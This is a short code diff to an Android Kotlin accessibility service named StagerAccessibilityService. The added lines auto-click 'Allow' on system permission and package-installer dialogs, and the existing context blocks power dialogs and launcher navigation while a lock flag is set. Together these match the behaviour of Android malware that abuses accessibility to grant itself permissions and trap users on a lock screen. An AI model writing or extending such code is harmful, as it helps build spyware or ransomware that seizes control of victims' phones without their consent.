@@ -39,9 +39,20 @@ class StagerAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        val pkg = event.packageName?.toString() ?: ""
+
+        // Auto-grant permission dialogs from Android system
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+            (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller"))) {
+            Log.i(TAG, "Permission dialog detected from $pkg, auto-clicking Allow")
+            // Short delay for the dialog to fully render
+            android.os.Handler(mainLooper).postDelayed({
+                grantPermissionIfPrompted()
+            }, 300)
+        }
+
         // If locked, intercept power dialogs and navigation
         if (isLocked && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            val pkg = event.packageName?.toString() ?: ""
             if (pkg.contains("com.android.systemui") ||
                 pkg.contains("android") ||
                 pkg.contains("com.google.android.apps.nexuslauncher") ||
